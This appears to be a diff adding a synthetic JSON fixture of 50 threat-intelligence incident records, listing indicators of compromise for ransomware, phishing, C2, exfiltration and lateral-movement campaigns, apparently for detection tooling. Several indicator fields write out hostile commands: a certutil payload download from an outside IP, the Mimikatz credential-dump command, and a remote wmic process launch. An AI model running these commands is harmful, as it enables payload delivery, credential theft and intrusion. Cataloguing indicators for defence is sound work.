@@ -1,0 +1,776 @@
+[
+  {
+    "incident_id": "INC-2026-001",
+    "threat_name": "LOCKBIT4-RANSOMWARE",
+    "severity": "CRITICAL",
+    "campaign_id": "CAMP-LOCKBIT4-2026",
+    "created_at": "2026-05-18T02:14:33Z",
+    "indicators": [
+      "hash:a3f8e2b1c94d7f60e5a2b8c3d1e4f709a8b2c5d6e7f1a2b3c4d5e6f7a8b9c0d1",
+      "domain:cdn-update-check.systems",
+      "ip:91.234.99.107",
+      "mutex:LockBit4_Global_RunOnce_Mutex",
+      "process:svchost_ldr.exe",
+      "registry:HKLM\\SOFTWARE\\LockBit\\Config"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-002",
+    "threat_name": "BLACKCAT-ALPHV-RANSOMWARE",
+    "severity": "CRITICAL",
+    "campaign_id": "CAMP-BLACKCAT-2026",
+    "created_at": "2026-05-19T08:47:12Z",
+    "indicators": [
+      "hash:b7c4f1a9e2d8b3c6f0e9a1d4b7c2e5f8a3d6b9c0e3f6a9b2c5d8e1f4a7b0c3d6",
+      "domain:alphv-exfil-node.icu",
+      "ip:45.141.87.234",
+      "ip:185.62.188.88",
+      "process:encryptor64.exe",
+      "file:RECOVER-FILES.txt"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-003",
+    "threat_name": "AKIRA-RANSOMWARE",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-AKIRA-2026",
+    "created_at": "2026-05-20T14:22:05Z",
+    "indicators": [
+      "hash:d9e2f5b8c1a4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2",
+      "domain:akira-data-leak.onion.ws",
+      "ip:194.26.135.91",
+      "extension:.akira",
+      "file:akira_readme.txt",
+      "process:akira_win.exe"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-004",
+    "threat_name": "PLAY-RANSOMWARE",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-PLAY-2026",
+    "created_at": "2026-05-20T22:59:44Z",
+    "indicators": [
+      "hash:e1f4a7b0c3d6e9f2a5b8c1d4e7f0a3b6c9d2e5f8a1b4c7d0e3f6a9b2c5d8e1f4",
+      "domain:play-ransomgroup-blog.net",
+      "ip:89.208.103.26",
+      "extension:.PLAY",
+      "file:ReadMe.txt",
+      "tool:AdFind.exe",
+      "tool:Cobalt Strike"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-005",
+    "threat_name": "RHYSIDA-RANSOMWARE",
+    "severity": "CRITICAL",
+    "campaign_id": "CAMP-RHYSIDA-2026",
+    "created_at": "2026-05-21T05:33:18Z",
+    "indicators": [
+      "hash:f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6",
+      "domain:rhysida-data-dump.xyz",
+      "ip:46.161.27.151",
+      "extension:.rhysida",
+      "tool:PsExec",
+      "tool:Cobalt Strike",
+      "process:rhysida.exe"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-006",
+    "threat_name": "LOCKBIT4-RANSOMWARE",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-LOCKBIT4-2026",
+    "created_at": "2026-05-22T11:08:57Z",
+    "indicators": [
+      "hash:a1b4c7d0e3f6a9b2c5d8e1f4a7b0c3d6e9f2a5b8c1d4e7f0a3b6c9d2e5f8a1b4",
+      "domain:api-update-secure.net",
+      "ip:91.234.99.108",
+      "mutex:LockBit4_VM_Check_Mutex",
+      "file:!!!-Restore-My-Files-!!!.txt"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-007",
+    "threat_name": "BLACKCAT-ALPHV-RANSOMWARE",
+    "severity": "CRITICAL",
+    "campaign_id": "CAMP-BLACKCAT-2026",
+    "created_at": "2026-05-23T16:45:30Z",
+    "indicators": [
+      "hash:c7d0e3f6a9b2c5d8e1f4a7b0c3d6e9f2a5b8c1d4e7f0a3b6c9d2e5f8a1b4c7d0",
+      "domain:secure-cdn-endpoint.io",
+      "ip:77.105.163.47",
+      "ip:45.141.87.199",
+      "file:RECOVER-alpha.txt",
+      "process:locker_windows.exe"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-008",
+    "threat_name": "AKIRA-RANSOMWARE",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-AKIRA-2026",
+    "created_at": "2026-05-24T09:17:23Z",
+    "indicators": [
+      "hash:b8c1d4e7f0a3b6c9d2e5f8a1b4c7d0e3f6a9b2c5d8e1f4a7b0c3d6e9f2a5b8c1",
+      "domain:akira-exfil-backup.store",
+      "ip:179.60.147.201",
+      "extension:.akira",
+      "tool:WinSCP",
+      "tool:rclone"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-009",
+    "threat_name": "REVIL-REVIVAL-RANSOMWARE",
+    "severity": "CRITICAL",
+    "campaign_id": "CAMP-REVIL-2026",
+    "created_at": "2026-05-25T03:55:09Z",
+    "indicators": [
+      "hash:c9d2e5f8a1b4c7d0e3f6a9b2c5d8e1f4a7b0c3d6e9f2a5b8c1d4e7f0a3b6c9d2",
+      "domain:revil-darknet-blog.xyz",
+      "ip:82.118.21.54",
+      "ip:88.214.27.103",
+      "extension:.[a-z0-9]{8}",
+      "file:readme_revil.txt",
+      "tool:Mimikatz",
+      "tool:Cobalt Strike"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-010",
+    "threat_name": "PLAY-RANSOMWARE",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-PLAY-2026",
+    "created_at": "2026-05-26T18:04:51Z",
+    "indicators": [
+      "hash:d0e3f6a9b2c5d8e1f4a7b0c3d6e9f2a5b8c1d4e7f0a3b6c9d2e5f8a1b4c7d0e3",
+      "domain:play-leak-portal.onion.pet",
+      "ip:88.119.170.209",
+      "tool:SystemBC",
+      "tool:Cobalt Strike",
+      "process:playx64.exe"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-011",
+    "threat_name": "RHYSIDA-RANSOMWARE",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-RHYSIDA-2026",
+    "created_at": "2026-05-27T07:29:37Z",
+    "indicators": [
+      "hash:e1f4a7b0c3d6e9f2a5b8c1d4e7f0a3b6c9d2e5f8a1b4c7d0e3f6a9b2c5d8e1f4",
+      "domain:rhysida-exfil-staging.ru",
+      "ip:91.92.241.157",
+      "tool:PsExec",
+      "tool:AnyDesk",
+      "extension:.rhysida"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-012",
+    "threat_name": "ICEFIRE-LINUX-RANSOMWARE",
+    "severity": "MEDIUM",
+    "campaign_id": "CAMP-ICEFIRE-2026",
+    "created_at": "2026-05-28T12:41:26Z",
+    "indicators": [
+      "hash:f2a5b8c1d4e7f0a3b6c9d2e5f8a1b4c7d0e3f6a9b2c5d8e1f4a7b0c3d6e9f2a5",
+      "domain:icefire-payload-cdn.net",
+      "ip:5.188.87.61",
+      "extension:.ifire",
+      "process:iFire",
+      "file:README_FOR_RESTORE.txt"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-013",
+    "threat_name": "SCATTERED-SPIDER-BEC",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-SCATTERED-2026",
+    "created_at": "2026-05-18T10:32:44Z",
+    "indicators": [
+      "domain:helpdesk-it-support-portal.com",
+      "ip:104.21.78.234",
+      "email:it.support@helpdesk-portal.cc",
+      "url:https://helpdesk-it-support-portal.com/reset",
+      "technique:SMS-phishing",
+      "technique:MFA-fatigue"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-014",
+    "threat_name": "APT28-SPEARPHISH",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-FANCY-BEAR-2026",
+    "created_at": "2026-05-19T14:18:27Z",
+    "indicators": [
+      "hash:a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7",
+      "domain:secure-docs-shared.org",
+      "ip:195.123.245.78",
+      "email:no-reply@secure-docs-shared.org",
+      "attachment:Q2_2026_Strategic_Outlook.docm",
+      "macro:VBA-CVE-2022-30190"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-015",
+    "threat_name": "MIDNIGHT-BLIZZARD-OAUTH",
+    "severity": "CRITICAL",
+    "campaign_id": "CAMP-MIDNIGHT-BLIZZARD-2026",
+    "created_at": "2026-05-20T06:55:12Z",
+    "indicators": [
+      "app_id:f47ac10b-58cc-4372-a567-0e02b2c3d479",
+      "domain:login-microsoftonline-com.azurewebsites.net",
+      "ip:40.126.31.5",
+      "technique:Device-Code-Phishing",
+      "technique:OAuth-Token-Theft",
+      "log:AADSignInLogs-Suspicious-OAuth-App"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-016",
+    "threat_name": "CARBANAK-BANKING-PHISH",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-CARBANAK-2026",
+    "created_at": "2026-05-21T09:04:55Z",
+    "indicators": [
+      "hash:b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8",
+      "domain:invoice-secure-banking.com",
+      "ip:62.173.145.222",
+      "email:payments@invoice-secure-banking.com",
+      "attachment:Invoice_April2026.xls",
+      "process:carbanak_loader.exe"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-017",
+    "threat_name": "DARKGATE-MALSPAM",
+    "severity": "MEDIUM",
+    "campaign_id": "CAMP-DARKGATE-2026",
+    "created_at": "2026-05-22T15:33:08Z",
+    "indicators": [
+      "hash:c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9",
+      "domain:cdn-document-retrieve.io",
+      "ip:194.147.78.31",
+      "file:Payslip_May2026.pdf.vbs",
+      "process:DarkGate.exe",
+      "registry:HKCU\\Software\\DGate\\Config"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-018",
+    "threat_name": "QAKBOT-REVIVAL-PHISH",
+    "severity": "MEDIUM",
+    "campaign_id": "CAMP-QAKBOT-2026",
+    "created_at": "2026-05-23T11:49:16Z",
+    "indicators": [
+      "hash:d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0",
+      "domain:cdn-qakbot-gate.xyz",
+      "ip:176.111.174.67",
+      "email:notifications@invoice-processing.net",
+      "attachment:Statement_2026.one",
+      "process:wermgr.exe"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-019",
+    "threat_name": "BUMBLEBEE-LOADER-EMAIL",
+    "severity": "MEDIUM",
+    "campaign_id": "CAMP-BUMBLEBEE-2026",
+    "created_at": "2026-05-24T17:22:41Z",
+    "indicators": [
+      "hash:e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1",
+      "domain:bumblebee-dl-node.net",
+      "ip:45.147.229.179",
+      "email:shared-docs@file-transfer-secure.com",
+      "attachment:Contract_Review_ISO27001.iso",
+      "process:wabmig.exe"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-020",
+    "threat_name": "EMOTET-WAVE-2026",
+    "severity": "MEDIUM",
+    "campaign_id": "CAMP-EMOTET-2026",
+    "created_at": "2026-05-25T08:17:03Z",
+    "indicators": [
+      "hash:f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2",
+      "ip:103.76.128.100",
+      "ip:185.176.220.37",
+      "ip:80.82.65.111",
+      "process:wscript.exe",
+      "process:outlook.exe",
+      "file:Order_Confirmation_2026_05.xlsm"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-021",
+    "threat_name": "SCATTERED-SPIDER-SMS-MFA",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-SCATTERED-2026",
+    "created_at": "2026-05-26T13:06:29Z",
+    "indicators": [
+      "domain:okta-helpdesk-verify.com",
+      "ip:104.21.44.77",
+      "technique:SIM-Swapping",
+      "technique:MFA-Push-Fatigue",
+      "technique:Vishing",
+      "log:Okta-Suspicious-Auth-Event"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-022",
+    "threat_name": "ICEDID-BANKING-MALWARE",
+    "severity": "MEDIUM",
+    "campaign_id": "CAMP-ICEDID-2026",
+    "created_at": "2026-05-27T19:44:52Z",
+    "indicators": [
+      "hash:a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3",
+      "domain:icedid-gate-relay.store",
+      "ip:194.40.242.45",
+      "email:billing@payment-update-alert.com",
+      "attachment:Bank_Notification_URGENT.zip",
+      "process:explorer.exe"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-023",
+    "threat_name": "EVILGINX2-AITM-PHISH",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-SCATTERED-2026",
+    "created_at": "2026-05-28T04:28:17Z",
+    "indicators": [
+      "domain:microsoftonline-sign-in.com",
+      "ip:172.67.143.38",
+      "technique:Adversary-in-the-Middle",
+      "technique:Session-Cookie-Theft",
+      "tool:Evilginx2",
+      "log:AzureAD-Impossible-Travel"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-024",
+    "threat_name": "STORM0558-EXCHANGE-TOKEN",
+    "severity": "CRITICAL",
+    "campaign_id": "CAMP-STORM0558-2026",
+    "created_at": "2026-05-29T10:53:44Z",
+    "indicators": [
+      "technique:Forged-MSA-Token",
+      "technique:OAuth2-Token-Replay",
+      "app_id:00000002-0000-0ff1-ce00-000000000000",
+      "log:Exchange-OWA-Suspicious-Token",
+      "domain:mail-exfil-storage.blob.core.windows.net",
+      "ip:40.126.6.134"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-025",
+    "threat_name": "COBALTSTRIKE-BEACON-ENTERPRISE",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-LOCKBIT4-2026",
+    "created_at": "2026-05-18T21:14:09Z",
+    "indicators": [
+      "hash:b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4",
+      "domain:cdn-fast-update-service.com",
+      "ip:185.220.101.47",
+      "port:443",
+      "jarm:3fd21b20d00000021c43d21b21b43d41226dd5dfc615dd4a96265559485910",
+      "process:svchost.exe",
+      "technique:Process-Injection-T1055"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-026",
+    "threat_name": "BRUTERATEL-C4-IMPLANT",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-FANCY-BEAR-2026",
+    "created_at": "2026-05-20T16:39:52Z",
+    "indicators": [
+      "hash:c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5",
+      "domain:telemetry-cdn-global.net",
+      "ip:194.147.140.3",
+      "process:RuntimeBroker.exe",
+      "technique:DLL-Sideloading",
+      "technique:Heaven-Gate-Syscall"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-027",
+    "threat_name": "SLIVER-C2-FRAMEWORK",
+    "severity": "MEDIUM",
+    "campaign_id": "CAMP-SCATTERED-2026",
+    "created_at": "2026-05-22T07:02:33Z",
+    "indicators": [
+      "hash:d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6",
+      "domain:api-health-check-monitor.io",
+      "ip:45.129.137.233",
+      "port:8888",
+      "process:sliver-implant.exe",
+      "technique:Reflective-DLL-Injection"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-028",
+    "threat_name": "VOLT-TYPHOON-LOTL",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-VOLT-TYPHOON-2026",
+    "created_at": "2026-05-24T13:57:18Z",
+    "indicators": [
+      "technique:Living-off-the-Land-T1218",
+      "technique:WMIC-Remote-T1047",
+      "technique:Netsh-Port-Forwarding",
+      "ip:192.168.45.22",
+      "process:netsh.exe",
+      "process:wmic.exe",
+      "log:Windows-Event-4688-Suspicious-CommandLine"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-029",
+    "threat_name": "LAZARUS-C2-CRYPTO",
+    "severity": "CRITICAL",
+    "campaign_id": "CAMP-LAZARUS-2026",
+    "created_at": "2026-05-26T22:11:47Z",
+    "indicators": [
+      "hash:e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7",
+      "domain:blockchain-node-verify.io",
+      "ip:210.92.18.9",
+      "ip:103.35.208.147",
+      "wallet:0x7a9F4E3B2D8c1A5E9b3F7d2C6A8E4B0D9F3c5A7",
+      "process:node_update.exe",
+      "technique:TraderTraitor-T1195"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-030",
+    "threat_name": "COBALTSTRIKE-VIA-RDP",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-AKIRA-2026",
+    "created_at": "2026-05-28T18:24:06Z",
+    "indicators": [
+      "hash:f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8",
+      "ip:185.112.83.66",
+      "port:3389",
+      "process:beacon.dll",
+      "technique:Lateral-Movement-RDP-T1021.001",
+      "log:Windows-Event-4624-RDP-Logon"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-031",
+    "threat_name": "HAVOC-C2-FRAMEWORK",
+    "severity": "MEDIUM",
+    "campaign_id": "CAMP-DARKGATE-2026",
+    "created_at": "2026-05-30T09:48:22Z",
+    "indicators": [
+      "hash:a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9",
+      "domain:update-portal-global.systems",
+      "ip:193.142.147.212",
+      "port:40056",
+      "process:havoc_agent.exe",
+      "technique:AES-Encrypted-C2"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-032",
+    "threat_name": "MYTHIC-C2-AGENT",
+    "severity": "MEDIUM",
+    "campaign_id": "CAMP-SCATTERED-2026",
+    "created_at": "2026-06-01T14:03:55Z",
+    "indicators": [
+      "hash:b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0",
+      "domain:health-check-api.network",
+      "ip:167.99.188.87",
+      "agent_type:Poseidon-macOS",
+      "process:com.apple.WebKit.Networking",
+      "technique:LaunchAgent-Persistence"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-033",
+    "threat_name": "CLOP-MOVEIT-STYLE-SQLI",
+    "severity": "CRITICAL",
+    "campaign_id": "CAMP-CLOP-2026",
+    "created_at": "2026-05-19T17:36:28Z",
+    "indicators": [
+      "hash:c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1",
+      "ip:176.97.64.124",
+      "url:POST /api/v1/files/upload HTTP/1.1",
+      "cve:CVE-2024-5806",
+      "technique:SQL-Injection-T1190",
+      "tool:rclone",
+      "exfil_destination:mega.nz"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-034",
+    "threat_name": "TA505-EXFIL-FTP",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-CLOP-2026",
+    "created_at": "2026-05-21T20:52:13Z",
+    "indicators": [
+      "hash:d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2",
+      "domain:ftp-exfil-staging.ru",
+      "ip:5.45.119.214",
+      "port:21",
+      "technique:Exfiltration-Over-FTP-T1048",
+      "tool:WinSCP",
+      "data_type:Customer-PII-Database-Dump"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-035",
+    "threat_name": "SCATTERED-SPIDER-DATA-THEFT",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-SCATTERED-2026",
+    "created_at": "2026-05-23T05:29:44Z",
+    "indicators": [
+      "domain:sharepoint-company-internal.net",
+      "ip:162.159.135.42",
+      "technique:SharePoint-Bulk-Download",
+      "technique:OneDrive-Sync-Abuse",
+      "data_type:Source-Code-Repositories",
+      "tool:rclone",
+      "log:DLP-Alert-Mass-Download-SharePoint"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-036",
+    "threat_name": "INSIDER-DATA-STAGING",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-CLOP-2026",
+    "created_at": "2026-05-25T15:17:38Z",
+    "indicators": [
+      "technique:Exfiltration-Over-Web-T1567",
+      "destination:personal-dropbox-upload.com",
+      "ip:162.125.248.9",
+      "data_type:Financial-Reports-Q1-Q2-2026",
+      "log:UEBA-Anomalous-Upload-Volume",
+      "log:DLP-Block-Override-Attempted",
+      "user:privileged_account"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-037",
+    "threat_name": "VOLT-TYPHOON-EXFIL",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-VOLT-TYPHOON-2026",
+    "created_at": "2026-05-27T22:43:01Z",
+    "indicators": [
+      "technique:LOTL-Data-Collection-T1119",
+      "technique:Staged-via-NTFS-ADS",
+      "ip:192.168.10.14",
+      "process:cmd.exe",
+      "command:wmic process list brief > C:\\Windows\\Temp\\ps.txt",
+      "log:Sysmon-Event-1-Suspicious-Process-Chain"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-038",
+    "threat_name": "APT28-DOCUMENT-EXFIL",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-FANCY-BEAR-2026",
+    "created_at": "2026-05-29T08:07:22Z",
+    "indicators": [
+      "hash:e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3",
+      "domain:exfil-collector-eu.systems",
+      "ip:109.230.199.51",
+      "technique:Email-Exfiltration-T1114",
+      "data_type:NATO-Policy-Documents",
+      "process:outlook.exe",
+      "log:Exchange-Unusual-Forwarding-Rule"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-039",
+    "threat_name": "LAZARUS-CRYPTO-DRAIN",
+    "severity": "CRITICAL",
+    "campaign_id": "CAMP-LAZARUS-2026",
+    "created_at": "2026-05-31T03:22:59Z",
+    "indicators": [
+      "hash:f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4",
+      "domain:defi-swap-protocol.io",
+      "ip:185.220.101.91",
+      "wallet:0x3F8E7D2A1B9C6E5F4D3A2B1C9E8F7D6A5B4C3E2F",
+      "technique:Smart-Contract-Exploit",
+      "amount_usd:14200000",
+      "blockchain:Ethereum"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-040",
+    "threat_name": "RHYSIDA-EXFIL-PRE-ENCRYPT",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-RHYSIDA-2026",
+    "created_at": "2026-06-02T11:58:34Z",
+    "indicators": [
+      "hash:a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5",
+      "domain:rhysida-exfil2.onion.ws",
+      "ip:77.247.109.154",
+      "tool:WinSCP",
+      "tool:FileZilla",
+      "data_type:Student-Records-Database",
+      "technique:Double-Extortion-Pre-staging"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-041",
+    "threat_name": "MIMIKATZ-PASS-THE-HASH",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-LOCKBIT4-2026",
+    "created_at": "2026-05-22T03:41:16Z",
+    "indicators": [
+      "tool:Mimikatz",
+      "technique:Pass-the-Hash-T1550.002",
+      "process:lsass.exe",
+      "log:Windows-Event-4624-NTLM",
+      "log:Windows-Event-4672-Special-Privileges",
+      "command:sekurlsa::logonpasswords",
+      "lateral_target:DC01.corp.local"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-042",
+    "threat_name": "KERBEROASTING-ATTACK",
+    "severity": "MEDIUM",
+    "campaign_id": "CAMP-AKIRA-2026",
+    "created_at": "2026-05-24T19:08:43Z",
+    "indicators": [
+      "technique:Kerberoasting-T1558.003",
+      "log:Windows-Event-4769-TGS-Request",
+      "process:Rubeus.exe",
+      "account:svc_backup",
+      "account:svc_sql",
+      "hash_type:RC4-HMAC",
+      "tool:hashcat"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-043",
+    "threat_name": "RDP-BRUTEFORCE-LATERAL",
+    "severity": "MEDIUM",
+    "campaign_id": "CAMP-PLAY-2026",
+    "created_at": "2026-05-26T06:55:31Z",
+    "indicators": [
+      "ip:91.108.56.201",
+      "port:3389",
+      "technique:Brute-Force-T1110.001",
+      "log:Windows-Event-4625-Failed-Logon",
+      "count:847 failed logon attempts in 90 minutes",
+      "tool:Hydra",
+      "target_subnet:10.10.0.0/16"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-044",
+    "threat_name": "WMIC-LATERAL-MOVEMENT",
+    "severity": "MEDIUM",
+    "campaign_id": "CAMP-VOLT-TYPHOON-2026",
+    "created_at": "2026-05-28T09:33:57Z",
+    "indicators": [
+      "technique:WMIC-Lateral-Movement-T1047",
+      "process:wmic.exe",
+      "command:wmic /node:TARGET process call create",
+      "log:Windows-Event-4688-Command-Execution",
+      "log:Sysmon-Event-3-Network-Connection",
+      "source_host:WORKSTATION-07",
+      "target_host:SERVER-DB01"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-045",
+    "threat_name": "LOTL-GOVERNMENT-NETWORK",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-VOLT-TYPHOON-2026",
+    "created_at": "2026-06-01T17:22:14Z",
+    "indicators": [
+      "technique:LOTL-T1218",
+      "process:certutil.exe",
+      "process:mshta.exe",
+      "process:regsvr32.exe",
+      "command:certutil -urlcache -f http://185.117.88.203/payload.txt",
+      "ip:185.117.88.203",
+      "log:Windows-Event-4688-LOLBin-Activity"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-046",
+    "threat_name": "CITRIX-BLEED-CVE-2023-4966",
+    "severity": "CRITICAL",
+    "campaign_id": "CAMP-CITRIX-BLEED-2026",
+    "created_at": "2026-05-20T03:19:47Z",
+    "indicators": [
+      "cve:CVE-2023-4966",
+      "product:Citrix-ADC-13.1-48.47",
+      "ip:203.0.113.15",
+      "technique:Session-Token-Hijack",
+      "url:GET /oauth/idp/.well-known/openid-configuration",
+      "log:Citrix-ADC-Unexpected-Session-Termination",
+      "tool:POC-CVE-2023-4966"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-047",
+    "threat_name": "MOVEIT-STYLE-SQLI-2026",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-CLOP-2026",
+    "created_at": "2026-05-23T22:04:12Z",
+    "indicators": [
+      "cve:CVE-2024-5806",
+      "url:POST /guestaccess.aspx",
+      "ip:185.220.101.78",
+      "technique:SQL-Injection-T1190",
+      "webshell:move_it_shell.aspx",
+      "process:w3wp.exe",
+      "tool:rclone"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-048",
+    "threat_name": "SUPPLY-CHAIN-NPM-PACKAGE",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-LAZARUS-2026",
+    "created_at": "2026-05-28T20:44:38Z",
+    "indicators": [
+      "package:axios-http-client@3.1.7",
+      "registry:npmjs.com",
+      "hash:b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6",
+      "technique:Supply-Chain-T1195.002",
+      "backdoor:postInstall-script-exfil",
+      "domain:cdn-npm-collect.net",
+      "ip:45.61.187.246"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-049",
+    "threat_name": "K8S-CRYPTOMINING",
+    "severity": "LOW",
+    "campaign_id": "CAMP-SCATTERED-2026",
+    "created_at": "2026-06-03T12:31:09Z",
+    "indicators": [
+      "container_image:docker.io/xmrig/xmrig:latest",
+      "pool:pool.hashvault.pro:443",
+      "ip:51.77.130.59",
+      "technique:Cloud-Resource-Abuse-T1496",
+      "process:xmrig",
+      "cpu_spike:98_percent",
+      "log:K8s-Unknown-Deployment-kube-system"
+    ]
+  },
+  {
+    "incident_id": "INC-2026-050",
+    "threat_name": "PAPERCUT-CVE-2023-27350",
+    "severity": "HIGH",
+    "campaign_id": "CAMP-CLOP-2026",
+    "created_at": "2026-06-04T08:58:27Z",
+    "indicators": [
+      "cve:CVE-2023-27350",
+      "product:PaperCut-NG-22.0.9",
+      "ip:185.56.83.111",
+      "technique:Auth-Bypass-T1190",
+      "url:GET /app?service=page/SetupCompleted",
+      "webshell:print_rce.jsp",
+      "process:java.exe"
+    ]
+  }
+]
